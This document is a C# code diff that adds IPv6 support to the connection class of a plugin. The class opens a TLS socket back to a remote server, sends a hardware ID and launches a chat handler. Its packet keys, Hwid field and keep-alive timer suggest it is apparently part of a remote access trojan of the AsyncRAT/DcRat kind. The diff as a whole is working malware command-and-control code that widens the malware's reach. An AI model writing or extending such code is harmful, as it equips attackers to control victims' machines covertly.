@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
+using System.Net;
 using System.Net.Security;
 using System.Net.Sockets;
 using System.Security.Authentication;
@@ -16,6 +17,7 @@ namespace Plugin
     public static class Connection
     {
         public static Socket TcpClient { get; set; }
+        public static Socket TcpClientV6 { get; set; }
         public static SslStream SslClient { get; set; }
         public static X509Certificate2 ServerCertificate { get; set; }
         private static byte[] Buffer { get; set; }
@@ -23,6 +25,7 @@ namespace Plugin
         private static long Offset { get; set; }
         private static Timer Tick { get; set; }
         public static bool IsConnected { get; set; }
+        public static bool IsConnectedV6 { get; set; }
         private static object SendSync { get; } = new object();
         public static string Hwid { get; set; }
 
@@ -36,40 +39,92 @@ namespace Plugin
                     ReceiveBufferSize = 50 * 1024,
                     SendBufferSize = 50 * 1024,
                 };
-
-                TcpClient.Connect(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[0], Convert.ToInt32(Plugin.Socket.RemoteEndPoint.ToString().Split(':')[1]));
-                if (TcpClient.Connected)
+                TcpClientV6 = new Socket(AddressFamily.InterNetworkV6, SocketType.Stream, ProtocolType.Tcp)
                 {
-                    Debug.WriteLine("Plugin Connected!");
-                    IsConnected = true;
-                    SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
-                    SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
-                    HeaderSize = 4;
-                    Buffer = new byte[HeaderSize];
-                    Offset = 0;
-                    Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
-                    SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+                    ReceiveBufferSize = 50 * 1024,
+                    SendBufferSize = 50 * 1024,
+                };
 
-                    new Thread(() =>
+                IPEndPoint remoteEndPoint = (IPEndPoint)Plugin.Socket.RemoteEndPoint;
+
+                if (IPAddress.TryParse(remoteEndPoint.Address.ToString(), out IPAddress i4or6))
+                {
+                    switch (i4or6.AddressFamily)
                     {
-                        MsgPack msgpack = new MsgPack();
-                        msgpack.ForcePathObject("Pac_ket").AsString = "chat-";
-                        msgpack.ForcePathObject("Hwid").AsString = Hwid;
-                        Send(msgpack.Encode2Bytes());
-                        new HandlerChat().CreateChat();
-                    }).Start();
+                        case System.Net.Sockets.AddressFamily.InterNetwork:
+                            TcpClient.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
+                            if (TcpClient.Connected)
+                            {
+                                //Debug.WriteLine("plugins ipv4 connected");
+                            }
+                            break;
+                        case System.Net.Sockets.AddressFamily.InterNetworkV6:
+                            TcpClientV6.Connect(remoteEndPoint.Address.ToString(), remoteEndPoint.Port);
+                            if (TcpClientV6.Connected)
+                            {
+                                //Debug.WriteLine("plugins ipv6 connected");
+                            }
+                            break;
+                    }
+                    if (TcpClient.Connected)
+                    {
+                        //Debug.WriteLine("Plugin Connected!");
+                        IsConnected = true;
+                        SslClient = new SslStream(new NetworkStream(TcpClient, true), false, ValidateServerCertificate);
+                        SslClient.AuthenticateAsClient(TcpClient.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                        HeaderSize = 4;
+                        Buffer = new byte[HeaderSize];
+                        Offset = 0;
+                        Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                        SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
 
-                }
-                else
-                {
-                    IsConnected = false;
-                    return;
+                        new Thread(() =>
+                        {
+                            MsgPack msgpack = new MsgPack();
+                            msgpack.ForcePathObject("Pac_ket").AsString = "chat-";
+                            msgpack.ForcePathObject("Hwid").AsString = Hwid;
+                            Send(msgpack.Encode2Bytes());
+                            new HandlerChat().CreateChat();
+                        }).Start();
+
+                    }
+                    else
+                    {
+                        IsConnected = false;
+                        if (TcpClientV6.Connected)
+                        {
+                            //Debug.WriteLine("Plugin Connected! ipv6");
+                            IsConnectedV6 = true;
+                            SslClient = new SslStream(new NetworkStream(TcpClientV6, true), false, ValidateServerCertificate);
+                            SslClient.AuthenticateAsClient(TcpClientV6.RemoteEndPoint.ToString().Split(':')[0], null, SslProtocols.Tls, false);
+                            HeaderSize = 4;
+                            Buffer = new byte[HeaderSize];
+                            Offset = 0;
+                            Tick = new Timer(new TimerCallback(CheckServer), null, new Random().Next(15 * 1000, 30 * 1000), new Random().Next(15 * 1000, 30 * 1000));
+                            SslClient.BeginRead(Buffer, 0, Buffer.Length, ReadServertData, null);
+
+                            new Thread(() =>
+                            {
+                                MsgPack msgpack = new MsgPack();
+                                msgpack.ForcePathObject("Pac_ket").AsString = "chat-";
+                                msgpack.ForcePathObject("Hwid").AsString = Hwid;
+                                Send(msgpack.Encode2Bytes());
+                                new HandlerChat().CreateChat();
+                            }).Start();
+
+                        }
+                        else
+                        {
+                            return;
+                        }
+                    }
                 }
             }
             catch
             {
                 Debug.WriteLine("Disconnected!");
                 IsConnected = false;
+                IsConnectedV6 = false;
                 return;
             }
         }
@@ -88,9 +143,11 @@ namespace Plugin
             try
             {
                 IsConnected = false;
+                IsConnectedV6 = false;
                 Tick?.Dispose();
                 SslClient?.Dispose();
                 TcpClient?.Dispose();
+                TcpClientV6?.Dispose();
             }
             catch { }
         }
@@ -102,8 +159,17 @@ namespace Plugin
                 if (!TcpClient.Connected || !IsConnected)
                 {
                     IsConnected = false;
-                    return;
+                    if (!TcpClientV6.Connected || !IsConnectedV6)
+                    {
+                        IsConnectedV6 = false;
+                        return;
+                    }
+                    else
+                    {
+                        goto accessed;
+                    }
                 }
+                accessed:
                 int recevied = SslClient.EndRead(ar);
                 if (recevied > 0)
                 {
@@ -123,6 +189,7 @@ namespace Plugin
                                 if (rc <= 0)
                                 {
                                     IsConnected = false;
+                                    IsConnectedV6 = false;
                                     return;
                                 }
                                 Offset += rc;
@@ -130,6 +197,7 @@ namespace Plugin
                                 if (HeaderSize < 0)
                                 {
                                     IsConnected = false;
+                                    IsConnectedV6 = false;
                                     return;
                                 }
                             }
@@ -149,6 +217,7 @@ namespace Plugin
                     else if (HeaderSize < 0)
                     {
                         IsConnected = false;
+                        IsConnectedV6 = false;
                         return;
                     }
                     SslClient.BeginRead(Buffer, (int)Offset, (int)HeaderSize, ReadServertData, null);
@@ -156,12 +225,14 @@ namespace Plugin
                 else
                 {
                     IsConnected = false;
+                    IsConnectedV6 = false;
                     return;
                 }
             }
             catch
             {
                 IsConnected = false;
+                IsConnectedV6 = false;
                 return;
             }
         }
@@ -174,11 +245,33 @@ namespace Plugin
                 {
                     if (!IsConnected || msg == null)
                     {
-                        return;
-                    }
+                        if (!IsConnectedV6)
+                        {
+                            return;
+                        }
+                        else
+                        {
+                            if (msg == null)
+                            {
+                                return;
+                            }
+                            else
+                            {
+                                goto next1;
+                            }
 
+                        }
+                    }
+                    next1:
                     byte[] buffersize = BitConverter.GetBytes(msg.Length);
-                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                    if (IsConnected)
+                    {
+                        TcpClient.Poll(-1, SelectMode.SelectWrite);
+                    }
+                    else
+                    {
+                        TcpClientV6.Poll(-1, SelectMode.SelectWrite);
+                    }
                     SslClient.Write(buffersize, 0, buffersize.Length);
 
                     if (msg.Length > 1000000) //1mb
@@ -191,14 +284,28 @@ namespace Plugin
                             byte[] chunk = new byte[50 * 1000];
                             while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                             {
-                                TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                if (IsConnected)
+                                {
+                                    TcpClient.Poll(-1, SelectMode.SelectWrite);
+                                }
+                                else
+                                {
+                                    TcpClientV6.Poll(-1, SelectMode.SelectWrite);
+                                }
                                 SslClient.Write(chunk, 0, read);
                             }
                         }
                     }
                     else
                     {
-                        TcpClient.Poll(-1, SelectMode.SelectWrite);
+                        if (IsConnected)
+                        {
+                            TcpClient.Poll(-1, SelectMode.SelectWrite);
+                        }
+                        else
+                        {
+                            TcpClientV6.Poll(-1, SelectMode.SelectWrite);
+                        }
                         SslClient.Write(msg, 0, msg.Length);
                         SslClient.Flush();
                     }
@@ -207,6 +314,7 @@ namespace Plugin
                 catch
                 {
                     IsConnected = false;
+                    IsConnectedV6 = false;
                     return;
                 }
             }
